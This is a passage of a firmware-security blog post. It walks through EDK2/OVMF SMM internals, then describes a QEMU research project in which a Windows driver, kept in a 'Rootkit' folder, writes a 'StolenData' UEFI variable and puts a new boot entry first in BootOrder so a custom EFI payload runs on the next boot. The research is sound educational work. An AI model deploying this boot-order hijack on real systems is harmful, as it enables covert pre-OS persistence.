+</span></span></code></pre></div><p>Since the OvmfPkg is virtual platform, some operations may missing or different than a real silicon.</p>
+<p>First of all, it check the <strong>mSmmCpuFeaturesSmmRelocated</strong> variable. This variable is set if <strong>gSmmBaseHobGuid</strong> is not null:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SmmCpuFeaturesLib.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>EFI_STATUS
+</span></span><span style="display:flex;"><span>EFIAPI
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MmCpuFeaturesLibConstructorCommon</span> (
+</span></span><span style="display:flex;"><span>  VOID
+</span></span><span style="display:flex;"><span>  )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// If gSmmBaseHobGuid found, means SmBase info has been relocated and recorded
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// in the SmBase array.
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  mSmmCpuFeaturesSmmRelocated <span style="color:#f92672">=</span> (BOOLEAN)(<span style="color:#a6e22e">GetFirstGuidHob</span> (<span style="color:#f92672">&amp;</span>gSmmBaseHobGuid) <span style="color:#f92672">!=</span> NULL);
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If this variable has a value, it means that SMBASE has already been relocated, so there is no need to relocate it again.</p>
+<p>The SMBASE pointer is calculated with hardcoded values. We already learned the offsets of SMBASE. It calculates <strong>0x30000</strong> value with <strong>0xFC00</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-h" data-lang="h"><span style="display:flex;"><span><span style="color:#75715e">// From UefiPayloadPkg/BlSupportSmm/BlSupportSmm.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define  SMRAM_SAVE_STATE_MAP_OFFSET  0xFC00    </span><span style="color:#75715e">/// Save state offset from SMBASE
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// From MdePkg/Include/Register/Intel/SmramSaveStateMap.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define SMRAM_SAVE_STATE_MAP_OFFSET  0xfc00
+</span></span></span></code></pre></div><p>The result we obtained is <strong>0x3FC00</strong>.</p>
+<p>After that the save state map area is prepared by <strong>SmramAccessGetCapabilities()</strong> function in <strong>SmramInternal.c</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EFI_STATUS
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SmramAccessGetCapabilities</span> (
+</span></span><span style="display:flex;"><span>  IN OUT UINTN                 <span style="color:#f92672">*</span>SmramMapSize,
+</span></span><span style="display:flex;"><span>  IN OUT EFI_SMRAM_DESCRIPTOR  <span style="color:#f92672">*</span>SmramMap
+</span></span><span style="display:flex;"><span>  )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  GuidHob         <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFirstGuidHob</span> (<span style="color:#f92672">&amp;</span>gEfiSmmSmramMemoryGuid);
+</span></span><span style="display:flex;"><span>  DescriptorBlock <span style="color:#f92672">=</span> <span style="color:#a6e22e">GET_GUID_HOB_DATA</span> (GuidHob);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  BufferSize <span style="color:#f92672">=</span> DescriptorBlock<span style="color:#f92672">-&gt;</span>NumberOfSmmReservedRegions <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span> (EFI_SMRAM_DESCRIPTOR);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>SmramMapSize <span style="color:#f92672">=</span> BufferSize;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (Index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; Index <span style="color:#f92672">&lt;</span> DescriptorBlock<span style="color:#f92672">-&gt;</span>NumberOfSmmReservedRegions; Index<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    SmramMap[Index].PhysicalStart <span style="color:#f92672">=</span> DescriptorBlock<span style="color:#f92672">-&gt;</span>Descriptor[Index].PhysicalStart;
+</span></span><span style="display:flex;"><span>    SmramMap[Index].CpuStart      <span style="color:#f92672">=</span> DescriptorBlock<span style="color:#f92672">-&gt;</span>Descriptor[Index].CpuStart;
+</span></span><span style="display:flex;"><span>    SmramMap[Index].PhysicalSize  <span style="color:#f92672">=</span> DescriptorBlock<span style="color:#f92672">-&gt;</span>Descriptor[Index].PhysicalSize;
+</span></span><span style="display:flex;"><span>    SmramMap[Index].RegionState   <span style="color:#f92672">=</span> DescriptorBlock<span style="color:#f92672">-&gt;</span>Descriptor[Index].RegionState;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Again we encounter &lsquo;GuidHob&rsquo;. The area is preapred with this value. <strong>SmramAccessGetCapabilities()</strong> function populates the Save State Map field descriptors, as we can see.</p>
+<h4 id="preparing-smi-handler-area"><strong>Preparing SMI Handler Area</strong></h4>
+<p>To understand how EDK2 prepares the SMI handler area, it is better to start from <strong>InitializeMpServiceData()</strong> in <strong>UefiCpuPkg/PiSmmCpuDxeSmm/MpService.c</strong>. After the page tables and per-CPU GDT/TSS tables are created, EDK2 installs one SMI entry stub for every logical processor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Create page tables
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  Cr3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmmInitPageTable</span> ();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  GdtTssTables <span style="color:#f92672">=</span> <span style="color:#a6e22e">InitGdt</span> (Cr3, <span style="color:#f92672">&amp;</span>GdtTableStepSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Install SMI handler for each CPU
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (Index <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; Index <span style="color:#f92672">&lt;</span> mMaxNumberOfCpus; Index<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">InstallSmiHandler</span> (
+</span></span><span style="display:flex;"><span>      Index,
+</span></span><span style="display:flex;"><span>      (UINT32)mCpuHotPlugData.SmBase[Index],
+</span></span><span style="display:flex;"><span>      (VOID <span style="color:#f92672">*</span>)((UINTN)Stacks <span style="color:#f92672">+</span> (StackSize <span style="color:#f92672">+</span> ShadowStackSize) <span style="color:#f92672">*</span> Index),
+</span></span><span style="display:flex;"><span>      StackSize,
+</span></span><span style="display:flex;"><span>      (UINTN)(GdtTssTables <span style="color:#f92672">+</span> GdtTableStepSize <span style="color:#f92672">*</span> Index),
+</span></span><span style="display:flex;"><span>      gcSmiGdtr.Limit <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>      gcSmiIdtr.Base,
+</span></span><span style="display:flex;"><span>      gcSmiIdtr.Limit <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>      Cr3
+</span></span><span style="display:flex;"><span>      );
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>This loop is important because EDK2 does not install one shared entry point for all processors. Instead, it prepares a CPU-specific handler area for each CPU. Every call to <strong>InstallSmiHandler()</strong> passes the current CPU index, that CPU&rsquo;s relocated <strong>SMBASE</strong>, its SMM stack, its private GDT, the SMM IDT, and the page-table base <strong>Cr3</strong>.</p>
+<p>The actual installation is performed in <strong>SmramSaveState.c</strong>. Here, <strong>InstallSmiHandler()</strong> writes the processor-specific descriptor into SMRAM, patches the handler template with runtime values, and copies the final bootstrap code to the real SMM entry address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  Psd <span style="color:#f92672">=</span> (PROCESSOR_SMM_DESCRIPTOR <span style="color:#f92672">*</span>)(VOID <span style="color:#f92672">*</span>)((UINTN)SmBase <span style="color:#f92672">+</span> SMM_PSD_OFFSET);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CopyMem</span> (Psd, <span style="color:#f92672">&amp;</span>gcPsd, <span style="color:#66d9ef">sizeof</span> (gcPsd));
+</span></span><span style="display:flex;"><span>  Psd<span style="color:#f92672">-&gt;</span>SmmGdtPtr  <span style="color:#f92672">=</span> (UINT64)GdtBase;
+</span></span><span style="display:flex;"><span>  Psd<span style="color:#f92672">-&gt;</span>SmmGdtSize <span style="color:#f92672">=</span> (UINT32)GdtSize;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InitShadowStack</span> (CpuIndex, (VOID <span style="color:#f92672">*</span>)((UINTN)SmiStack <span style="color:#f92672">+</span> StackSize));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Initialize values in template before copy
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  CpuSmiStack <span style="color:#f92672">=</span> (UINT32)((UINTN)SmiStack <span style="color:#f92672">+</span> StackSize <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span> (UINTN));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">PatchInstructionX86</span> (gPatchSmiStack, CpuSmiStack, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">PatchInstructionX86</span> (gPatchSmiCr3, Cr3, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">PatchInstructionX86</span> (gPatchSmbase, SmBase, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  gSmiHandlerIdtr.Base  <span style="color:#f92672">=</span> IdtBase;
+</span></span><span style="display:flex;"><span>  gSmiHandlerIdtr.Limit <span style="color:#f92672">=</span> (UINT16)(IdtSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Set the value at the top of the CPU stack to the CPU Index
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(UINTN <span style="color:#f92672">*</span>)(UINTN)CpuSmiStack <span style="color:#f92672">=</span> CpuIndex;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Copy template to CPU specific SMI handler location
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CopyMem</span> (
+</span></span><span style="display:flex;"><span>    (VOID <span style="color:#f92672">*</span>)((UINTN)SmBase <span style="color:#f92672">+</span> SMM_HANDLER_OFFSET),
+</span></span><span style="display:flex;"><span>    (VOID <span style="color:#f92672">*</span>)gcSmiHandlerTemplate,
+</span></span><span style="display:flex;"><span>    gcSmiHandlerSize
+</span></span><span style="display:flex;"><span>    );
+</span></span></code></pre></div><p>Here, <strong>SMM_HANDLER_OFFSET</strong> is <strong>0x8000</strong>, so the code is copied to <strong>SMBASE + 0x8000</strong>. The <strong>PROCESSOR_SMM_DESCRIPTOR</strong> is placed at <strong>SMBASE + 0xFB00</strong>. In other words, EDK2 is preparing a per-CPU bootstrap trampoline inside SMRAM.</p>
+<p>The actual code template is <strong>gcSmiHandlerTemplate</strong>, which comes from <strong>UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiEntry.nasm</strong> in the x64 path. So at this stage, EDK2 is not dispatching the final firmware SMI handlers yet. It is only preparing the low-level entry environment that will run immediately after the processor enters SMM.</p>
+<h4 id="handling-a-smi"><strong>Handling a SMI</strong></h4>
+<p>When an SMI is triggered, the processor starts executing the code that was copied to <strong>SMBASE + 0x8000</strong>. In the x64 path, that entry stub eventually transfers control to <strong>SmiRendezvous()</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">strict</span> <span style="color:#66d9ef">qword</span> <span style="color:#ae81ff">0</span>         <span style="color:#75715e">;   call    ASM_PFX(SmiRendezvous)
+</span></span></span><span style="display:flex;"><span>SmiRendezvousAbsAddr:
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">call</span>    <span style="color:#66d9ef">rax</span>
+</span></span></code></pre></div><p>This is the important connection: inside <strong>UefiCpuPkg</strong>, the first C routine that handles an incoming SMI is <strong>SmiRendezvous()</strong> in <strong>MpService.c</strong>.</p>
+<p><strong>SmiRendezvous()</strong> first handles one-time SMM initialization for a CPU, then validates the SMI source, synchronizes the processors, and decides whether the current CPU will run the BSP path or the AP path:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>mSmmInitialized[CpuIndex]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Perform InitializeSmm for CpuIndex
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">InitializeSmm</span> ();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">RestoreCr2</span> (Cr2);
+</span></span><span style="display:flex;"><span>    mSmmInitialized[CpuIndex] <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ValidSmi <span style="color:#f92672">=</span> <span style="color:#a6e22e">PlatformValidSmi</span> ();
+</span></span><span style="display:flex;"><span>  BspInProgress <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>mSmmMpSyncData<span style="color:#f92672">-&gt;</span>InsideSmm;
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (mSmmMpSyncData<span style="color:#f92672">-&gt;</span>BspIndex <span style="color:#f92672">==</span> CpuIndex) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">BSPHandler</span> (CpuIndex, mSmmMpSyncData<span style="color:#f92672">-&gt;</span>EffectiveSyncMode);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">APHandler</span> (CpuIndex, ValidSmi, mSmmMpSyncData<span style="color:#f92672">-&gt;</span>EffectiveSyncMode);
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>So the handler that really handles SMI entry inside <strong>UefiCpuPkg</strong> is <strong>SmiRendezvous()</strong>. One CPU is elected as BSP and executes <strong>BSPHandler()</strong>, while the other processors follow <strong>APHandler()</strong>.</p>
+<p>Before <strong>PiSmmCore</strong> can run, it has to register its entry point. This is done through <strong>RegisterSmmEntry()</strong>, which stores the core callback in <strong>gSmmCpuPrivate-&gt;SmmCoreEntry</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>EFI_STATUS
+</span></span><span style="display:flex;"><span>EFIAPI
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RegisterSmmEntry</span> (
+</span></span><span style="display:flex;"><span>  IN CONST EFI_SMM_CONFIGURATION_PROTOCOL  <span style="color:#f92672">*</span>This,
+</span></span><span style="display:flex;"><span>  IN EFI_SMM_ENTRY_POINT                   SmmEntryPoint
+</span></span><span style="display:flex;"><span>  )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Record SMM Foundation EntryPoint, later invoke it on SMI entry vector.
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  gSmmCpuPrivate<span style="color:#f92672">-&gt;</span>SmmCoreEntry <span style="color:#f92672">=</span> SmmEntryPoint;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> EFI_SUCCESS;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Later, in the BSP path, <strong>UefiCpuPkg</strong> invokes that registered entry point:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Perform the pre tasks
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">PerformPreTasks</span> ();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Invoke SMM Foundation EntryPoint with the processor information context.
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  gSmmCpuPrivate<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">SmmCoreEntry</span> (<span style="color:#f92672">&amp;</span>gSmmCpuPrivate<span style="color:#f92672">-&gt;</span>SmmCoreEntryContext);
+</span></span></code></pre></div><p>This is the bridge between <strong>UefiCpuPkg</strong> and <strong>PiSmmCore</strong>. After this handoff, <strong>PiSmmCore</strong>&rsquo;s <strong>SmmEntryPoint</strong> updates the SMM core context:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Update SMST with contents of the SmmEntryContext structure
+</span></span></span><span style="display:flex;"><span>  <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span>  gSmmCoreSmst.SmmStartupThisAp      <span style="color:#f92672">=</span> SmmEntryContext<span style="color:#f92672">-&gt;</span>SmmStartupThisAp;
+</span></span><span style="display:flex;"><span>  gSmmCoreSmst.CurrentlyExecutingCpu <span style="color:#f92672">=</span> SmmEntryContext<span style="color:#f92672">-&gt;</span>CurrentlyExecutingCpu;
+</span></span><span style="display:flex;"><span>  gSmmCoreSmst.NumberOfCpus          <span style="color:#f92672">=</span> SmmEntryContext<span style="color:#f92672">-&gt;</span>NumberOfCpus;
+</span></span><span style="display:flex;"><span>  gSmmCoreSmst.CpuSaveStateSize      <span style="color:#f92672">=</span> SmmEntryContext<span style="color:#f92672">-&gt;</span>CpuSaveStateSize;
+</span></span><span style="display:flex;"><span>  gSmmCoreSmst.CpuSaveState          <span style="color:#f92672">=</span> SmmEntryContext<span style="color:#f92672">-&gt;</span>CpuSaveState;
+</span></span></code></pre></div><p>After that, it eventually reaches <strong>SmiManage()</strong>, which iterates over the registered SMI handlers and calls them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  Head <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>SmiEntry<span style="color:#f92672">-&gt;</span>SmiHandlers;
+</span></span><span style="display:flex;"><span>  mSmiManageCallingDepth<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (Link <span style="color:#f92672">=</span> Head<span style="color:#f92672">-&gt;</span>ForwardLink; Link <span style="color:#f92672">!=</span> Head; Link <span style="color:#f92672">=</span> Link<span style="color:#f92672">-&gt;</span>ForwardLink) {
+</span></span><span style="display:flex;"><span>    SmiHandler <span style="color:#f92672">=</span> <span style="color:#a6e22e">CR</span> (Link, SMI_HANDLER, Link, SMI_HANDLER_SIGNATURE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Call the SMI Handler */</span>
+</span></span><span style="display:flex;"><span>    Status <span style="color:#f92672">=</span> SmiHandler<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Handler</span> (
+</span></span><span style="display:flex;"><span>                         (EFI_HANDLE)SmiHandler,
+</span></span><span style="display:flex;"><span>                         Context,
+</span></span><span style="display:flex;"><span>                         CommBuffer,
+</span></span><span style="display:flex;"><span>                         CommBufferSize
+</span></span><span style="display:flex;"><span>                         );
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>So the flow is actually: <strong>InstallSmiHandler()</strong> prepares the per-CPU bootstrap code, <strong>gcSmiHandlerTemplate</strong> runs at <strong>SMBASE + 0x8000</strong>, <strong>SmiRendezvous()</strong> handles SMI entry inside <strong>UefiCpuPkg</strong>, the BSP path invokes <strong>PiSmmCore</strong> through the registered <strong>SmmEntryPoint</strong>, and finally <strong>SmiManage()</strong> dispatches the individual SMI handlers. In EDK2, the communication with an SMI handler is performed through <strong>EFI_SMM_COMMUNICATE_HEADER</strong>. I will touch that protocol later.</p>
+<h3 id="abyss-of-nun-project"><strong>Abyss of Nun Project</strong></h3>
+<p>After digging into the internals of EDK2, I wanted a smaller project where the path from Windows to DXE and then into SMM could be observed directly. That is what <a href="https://github.com/0xbekoo/Abyss-of-Nun">Abyss of Nun</a> became: a QEMU + OVMF research project that stages a value in Windows, retrieves it again in pre-OS firmware, and finally forwards it into an SMM handler. The important point is that the project does <strong>not</strong> try to access SMRAM directly from Ring 0. Instead, it follows the interfaces that firmware actually exposes. Here&rsquo;s a diagram for the project:</p>
+<div style="text-align: center;">
+  <img src="/images/posts/smm-blog/project-diagram.png" />
+</div> <br> <br>
+<p>At a high level, the chain looks like this:</p>
+<ol>
+<li>A Windows driver writes a <code>StolenData</code> UEFI variable.</li>
+<li>The same driver modifies the boot flow so <code>TriggerSMI.efi</code> is executed on the next boot.</li>
+<li><code>TriggerSMI.efi</code> reads that variable and sends it to SMM through <code>EFI_SMM_COMMUNICATION_PROTOCOL</code>.</li>
+<li>The SMM driver receives the buffer through a registered MMI handler.</li>
+</ol>
+<h4 id="stage-1-windows-prepares-the-hand-off"><strong>Stage 1: Windows Prepares the Hand-off</strong></h4>
+<p>The Windows side lives under <code>Rootkit/Rootkit/main.c</code>. First, the driver defines the EFI payload path and the vendor GUID that will be used for the shared NVRAM variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>WCHAR EfiPath[] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">EFI</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BOOT</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">TriggerSMI.efi&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GUID VendorGuid <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xa1b2c3d4</span>, <span style="color:#ae81ff">0x1234</span>, <span style="color:#ae81ff">0x5678</span>, {<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0xbc</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x67</span>,<span style="color:#ae81ff">0x57</span>}
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>These two values already show the intent of the driver. One value points to the firmware-stage payload, and the other defines the namespace for the data that the firmware side will later read.</p>
+<p>The next step is the more interesting one: the driver rewrites the boot path by creating <code>Boot0009</code> and prepending it to <code>BootOrder</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>BootOrderName, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;BootOrder&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>PayloadVarName, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Boot0009&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NewOrderArray[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> TargetBootIndex;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlCopyMemory</span>(<span style="color:#f92672">&amp;</span>NewOrderArray[<span style="color:#ae81ff">1</span>], OrderArray, BootOrderSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ExSetFirmwareEnvironmentVariable</span>(
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>BootOrderName,
+</span></span><span style="display:flex;"><span>  (LPGUID)<span style="color:#f92672">&amp;</span>EfiGlobalVariableGuid,
+</span></span><span style="display:flex;"><span>  NewOrderArray,
+</span></span><span style="display:flex;"><span>  NewOrderSize,
+</span></span><span style="display:flex;"><span>  TARGET_ATTRIBUTES
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>This part matters because the driver is not invoking SMM by itself. It is preparing the next boot so that firmware executes <code>TriggerSMI.efi</code> before the normal Windows boot path resumes. In other words, Windows becomes the staging layer, not the direct SMM caller.</p>
+<p>Finally, <code>DriverEntry()</code> writes the payload into NVRAM as <code>StolenData</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>UNICODE_STRING VariableName <span style="color:#f92672">=</span> <span style="color:#a6e22e">RTL_CONSTANT_STRING</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;StolenData&#34;</span>);
+</span></span><span style="display:flex;"><span>WCHAR Buffer[] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;im cooked!&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">ExSetFirmwareEnvironmentVariable</span>(
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>VariableName,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>VendorGuid,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&amp;</span>Buffer,
+</span></span><span style="display:flex;"><span>  BufferSize,
+</span></span><span style="display:flex;"><span>  Attributes
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>So the Windows half of the repository does two jobs: it stores the value in a firmware-visible variable, and it ensures that the DXE-stage bridge will run on the next boot.</p>
+<h4 id="stage-2-dxe-bridges-the-data-into-smm"><strong>Stage 2: DXE Bridges the Data into SMM</strong></h4>
